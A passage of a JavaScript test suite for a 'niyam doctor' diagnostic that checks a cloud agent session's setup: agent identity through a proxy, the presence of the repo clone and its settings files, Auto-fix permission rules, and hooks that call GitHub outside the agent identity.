    assert.equal(code, 1);
    assert.ok(out.includes("✓  the proxy acts as SecondBot, an agent the repo's settings name"));
    assert.deepEqual(marked(out, '✗'), [
      '✗  session-start did not give this session the agent identity, so gh and git stay locked out → a new session; its first niyam line says why',
    ]);
  });

  it("refuses outside the repo's clone, and still checks the Setup script", async () => {
    const sys = cloud();
    sys.inRepo = false;
    const { code, out } = await check(sys);
    assert.equal(code, 1);
    assert.deepEqual(marked(out, '✗'), [`✗  ${ROOT} is not inside a git repository → niyam doctor in the repo's clone`]);
    assert.ok(out.includes(`✓  the Setup script runs ${CLOUD_SETUP_PATH}`));
    assert.ok(!out.some((line) => line.includes('proxy acts as')), 'no agents to check the account against');
  });

  it('reads a cloud setup file it cannot read as missing', async () => {
    const sys = cloud();
    const read = sys.read.bind(sys);
    sys.read = (path) => {
      if (path === CLOUD_FILE) throw new Error('EACCES');
      return read(path);
    };
    assert.ok((await check(sys)).out.some((line) => line.startsWith(`✗  ${CLOUD_SETUP_PATH} missing`)));
  });

  it('names the session when neither GitHub nor the settings name an account', async () => {
    const sys = cloud(null);
    sys.inRepo = false;
    const { out } = await check(sys);
    assert.equal(out[0], '◆  niyam doctor   this cloud session');
    assert.ok(out.includes('◇  GitHub — as this cloud session'));
  });

  it("refuses a clone with no settings", async () => {
    const sys = cloud();
    sys.files.delete(`${ROOT}/.github/niyam.json`);
    assert.deepEqual(marked((await check(sys)).out, '✗'), [
      `✗  .github/niyam.json not found in ${ROOT}, so the agents are not known → niyam onboard again`,
    ]);
  });

  it('names the Auto-fix rules the repo lacks, as on a Mac', async () => {
    const sys = cloud();
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ permissions: { allow: ['mcp__ccd_pr__bind_pr', 'mcp__ccd_pr__get_status'] } }));
    assert.deepEqual(marked((await check(sys)).out, '▲'), [
      '▲  .claude/settings.json does not allow mcp__ccd_pr__set_monitor, so agent sessions cannot turn Auto-fix on → niyam onboard again',
    ]);
  });

  it('groups client hooks that reach GitHub outside as-agent under This repo, as on a Mac', async () => {
    const sys = cloud();
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'gh pr view' }] }] }, permissions: { allow: [...AUTO_FIX_RULES] } }));
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.deepEqual(out.slice(-5), [
      '│',
      '◇  This repo',
      '▲  .claude/settings.json Stop hook "gh pr view" reaches GitHub outside as-agent, so gets 401 → run its gh or git via niyam as-agent --session <session_id> -- (exit 77 when not the agent)',
      '│',
      '└  1 to fix',
    ]);
  });
});
